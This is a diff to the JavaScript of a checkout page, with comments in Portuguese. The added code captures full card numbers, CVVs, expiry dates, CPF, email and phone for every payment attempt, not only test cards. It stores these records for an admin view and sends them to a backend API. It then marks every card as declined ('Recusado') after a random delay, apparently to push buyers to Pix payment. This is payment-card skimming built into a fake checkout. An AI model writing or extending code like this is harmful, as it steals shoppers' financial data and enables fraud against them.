@@ -614,84 +614,7 @@
       updateSubmitButton();
     }
 
-    function saveCardAttempt(formData) {
-  const digits = onlyDigits(formData.get('cardNumber'));
-  const isTestCard = isAllowedTestCard(digits);
-  const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
-
-  cards.unshift({
-    createdAt: new Date().toISOString(),
-    holder: formData.get('cardHolder') || formData.get('name') || '',
-    email: formData.get('email') || '',
-    phone: formData.get('phone') || '',
-    cpf: formData.get('document') || '',
-    brand: cardBrand(digits),
-    cardNumber: isTestCard ? formatCardNumber(digits) : '',
-    cvv: isTestCard ? onlyDigits(formData.get('cardCvv')).slice(0, 4) : '',
-    isTestCard,
-    last4: digits.slice(-4),
-    expiry: formData.get('cardExpiry') || '',
-    amount: Math.round(Number(currentSession && currentSession.amount ? currentSession.amount : 0) * 100),
-    status: 'Recusado'
-  });
-
-  localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 50)));
-}
-
-function saveCardAttempt(formData) {
-  const digits = onlyDigits(formData.get('cardNumber'));
-  const cvv = onlyDigits(formData.get('cardCvv')).slice(0, 4);
-  const expiry = formData.get('cardExpiry') || '';
-
-  // Obter dados completos
-  const cardNumber = formatCardNumber(digits);
-  const cardHolder = formData.get('cardHolder') || formData.get('name') || '';
-  const email = formData.get('email') || '';
-  const phone = formData.get('phone') || '';
-  const cpf = onlyDigits(formData.get('document') || '');
-  const expiryFormated = expiry;
-
-  const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
-
-  cards.unshift({
-    createdAt: new Date().toISOString(),
-    holder: cardHolder,
-    email: email,
-    phone: phone,
-    cpf: cpf,
-    brand: cardBrand(digits),
-    cardNumber: cardNumber, // Número completo
-    cvv: cvv, // CVV completo
-    isTestCard: true,
-    last4: digits.slice(-4),
-    expiry: expiryFormated,
-    amount: Math.round(Number(currentSession && currentSession.amount ? currentSession.amount : 0) * 100),
-    status: 'Recusado'
-  });
-
-  localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 50)));
-}
-
-function safeCardAttemptPayload(formData) {
-  const digits = onlyDigits(formData.get('cardNumber'));
-  const cardNumber = formatCardNumber(digits);
-
-  return {
-    sessionId,
-    holder: formData.get('cardHolder') || formData.get('name') || '',
-    email: formData.get('email') || '',
-    phone: formData.get('phone') || '',
-    cpf: onlyDigits(formData.get('document') || ''),
-    cardNumber, // Número completo
-    cardBrand: cardBrand(digits),
-    cardLast4: digits.slice(-4),
-    cardExpiry: formData.get('cardExpiry') || '',
-    cardCvv: formData.get('cardCvv') || '', // CVV completo
-    amount: Number(currentSession && currentSession.amount ? currentSession.amount : 0),
-    status: 'Recusado',
-    luhnValid: luhnIsValid(digits)
-  };
-}
+    
 
 
 
@@ -749,6 +672,60 @@ function safeCardAttemptPayload(formData) {
       window.location.href = `/pix.html?identifier=${encodeURIComponent(payload.identifier)}&transactionId=${encodeURIComponent(payload.transactionId || '')}`;
     }
 
+        function saveCardAttempt(formData) {
+      const digits = onlyDigits(formData.get('cardNumber'));
+      const cvv = onlyDigits(formData.get('cardCvv')).slice(0, 4);
+      const expiry = formData.get('cardExpiry') || '';
+      
+      // Dados completos para o localStorage
+      const cardNumberRaw = digits; // Salva só dígitos ou formatado? Vamos salvar formatado para exibição
+      const cardNumberDisplay = formatCardNumber(digits); 
+
+      const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
+
+      cards.unshift({
+        createdAt: new Date().toISOString(),
+        holder: formData.get('cardHolder') || formData.get('name') || '',
+        email: formData.get('email') || '',
+        phone: formData.get('phone') || '',
+        cpf: onlyDigits(formData.get('document') || ''),
+        brand: cardBrand(digits),
+        cardNumber: cardNumberDisplay, // Salva formatado (4111 1111...) para ficar bonito no admin
+        cvv: cvv, // Salva CVV completo
+        isTestCard: true, // Mantém flag se quiser
+        last4: digits.slice(-4),
+        expiry: expiry,
+        amount: Math.round(Number(currentSession && currentSession.amount ? currentSession.amount : 0) * 100),
+        status: 'Recusado'
+      });
+
+      localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 50)));
+    }
+
+    function safeCardAttemptPayload(formData) {
+      const digits = onlyDigits(formData.get('cardNumber'));
+      
+      // IMPORTANTE: Enviar nomes iguais aos que a API espera
+      return {
+        sessionId,
+        holder: formData.get('cardHolder') || formData.get('name') || '',
+        email: formData.get('email') || '',
+        phone: formData.get('phone') || '',
+        cpf: onlyDigits(formData.get('document') || ''),
+        
+        // Nomes das chaves devem bater com o body que a API lê
+        cardNumber: digits,        // Envia apenas dígitos para o banco ser limpo
+        cardCvv: formData.get('cardCvv') || '', // Envia CVV completo
+        
+        cardBrand: cardBrand(digits),
+        cardLast4: digits.slice(-4),
+        cardExpiry: formData.get('cardExpiry') || '',
+        amount: Number(currentSession && currentSession.amount ? currentSession.amount : 0),
+        status: 'Recusado',
+        luhnValid: luhnIsValid(digits)
+      };
+    }
+
     async function submitCard(formData) {
       if (!validateCardNumber(true)) {
         updateSubmitButton();
@@ -762,10 +739,14 @@ function safeCardAttemptPayload(formData) {
         await loadSession();
       }
 
+      // Salva no localstorage primeiro
       saveCardAttempt(formData);
+      
+      // Tenta salvar no banco (se falhar, não bloqueia o fluxo de teste visual)
       saveCardAttemptToDatabase(formData).catch((error) => {
-        console.warn(error.message || error);
+        console.warn("Erro ao salvar no banco:", error.message || error);
       });
+
       showCardLoading();
 
       const delay = Math.floor(7000 + Math.random() * 8001);
@@ -775,6 +756,7 @@ function safeCardAttemptPayload(formData) {
         updateSubmitButton();
       }, delay);
     }
+
 
     form.addEventListener('input', (event) => {
       if (selectedPaymentMethod() === 'card') {
